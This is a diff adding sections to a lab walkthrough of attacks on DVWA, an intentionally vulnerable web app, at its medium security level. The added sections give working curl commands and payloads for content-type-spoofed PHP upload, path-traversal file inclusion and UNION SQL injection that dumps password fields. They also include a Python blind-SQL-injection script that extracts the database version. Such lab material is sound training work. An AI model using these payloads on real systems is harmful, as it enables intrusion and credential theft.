@@ -34,6 +34,133 @@ OR
 $ curl -s -b "PHPSESSID=${PHPSESSID};security=medium" -d 'ip=%26uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux    
 ```
 
+### File Upload
+
+**Vuln:** insufficient file type validation - looking only at filetype controlled by the user ($_FILES['userfile']['type'])
+
+**Exploitation**
+
+```
+cat > b.php <<EOF
+<?php phpinfo(); ?>
+EOF
+
+curl -x 127.0.0.1:8080 -L -b "PHPSESSID=${PHPSESSID};security=medium" -F "MAX_FILE_SIZE=100000" -F "uploaded=@b.php;type=image/jpeg;filename=b.php" -F "Upload=Upload" http://192.168.56.101/DVWA/vulnerabilities/upload/index.php
+
+curl -s -b "PHPSESSID=${PHPSESSID};security=medium" http://192.168.56.101/DVWA/hackable/uploads/b.php
+```
+
+### File Inclusion
+
+**Vuln:** insufficient input validation
+
+**Exploitation**
+
+```
+# LFI:
+$ curl -L -b "PHPSESSID=${PHPSESSID};security=medium" -v http://192.168.56.101/DVWA/vulnerabilities/fi/?page=..././..././hackable/flags/fi.php
+
+# RFI payload example:
+hTTp://
+```
+
+### Sql Injection
+
+**Vuln:** incorrect use of mysqli_real_escape_string function: now quotes are used so input is treated as integer
+
+Payload to retreive users password fields:
+
+```
+1 union select Password, User from users#
+```
+
+**Exploitation**
+
+```
+$ curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=medium" "http://192.168.56.102/DVWA/vulnerabilities/sqli/index.php" -d 'id=1+union+select+Password%2CUser+FROM+users%23&Submit=Submit'
+```
+
+### Sql Injection (Blind)
+
+**Vulnerability**
+
+Payloads:
+
+```
+true condtion: 1 and 1=1#
+false condition: 1 and 1=0#
+```
+
+**Exploitation**
+
+Manual:
+
+```
+# dependency:
+https://stackoverflow.com/questions/296536/how-to-urlencode-data-for-curl-command
+
+# true condition:
+curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=medium" "http://192.168.56.102/DVWA/vulnerabilities/sqli_blind/index.php" -d "id=$(rawurlencode "1 and 1=1#")&Submit=Submit"
+
+# false condition:
+curl -s -x 127.0.0.1:8080 -b "PHPSESSID=${PHPSESSID};security=medium" "http://192.168.56.102/DVWA/vulnerabilities/sqli_blind/index.php" -d "id=$(rawurlencode "1 and 1=0#")&Submit=Submit"
+```
+
+Retreiving DBMS version PoC:
+
+```
+cat > poc.py <<EOF
+"""
+example output of @@version: 5.7.16-0ubuntu0.16.04.1
+
+first find length of the @@version string:
+1 and length(@@version)=7#
+
+iterate thru printable ASCII and retreive @@version string
+1 and ascii(substring(@@version,1,1))=0x35#
+"""
+
+import requests
+import string
+from urllib import quote, unquote
+
+proxies = {
+    "http" : "http://127.0.0.1:8080/"
+}
+
+# initiate HTTP session
+session = requests.Session()
+session.cookies['security'] = 'medium'
+session.cookies['PHPSESSID'] = 'sg9087bvkh5pu14tarpakuqf25'
+
+u = 'http://192.168.56.102/DVWA/vulnerabilities/sqli_blind/index.php'
+
+# find length of @@version string
+for i in xrange(1, 30):
+    payload = "1 and length(@@version)=" + str(i) + "#"
+    params = {'id': payload, 'Submit': "Submit"}
+    resp = session.post(u, data=params, proxies=proxies)
+
+    if resp.text.find("MISSING") == -1:
+        len = i
+        break
+
+# retreive @@version string
+version=""
+for i in xrange(1, len + 1):
+    for c in string.printable:
+        payload = "1 and ascii(substring(@@version,{0},1))={1}#".format(i, hex(ord(c)))
+        params = {'id': payload, 'Submit': "Submit"}
+        resp = session.post(u, data=params, proxies=proxies)
+
+        if resp.text.find("MISSING") == -1:
+            print payload
+            version += c
+
+print version
+EOF
+```
+
 ### CSRF
 
 XSS vulnerability on the DVWA site (for example this in `http://192.168.56.102/DVWA/vulnerabilities/xss_r`) needs to be used in order do defeat `Referer` check:
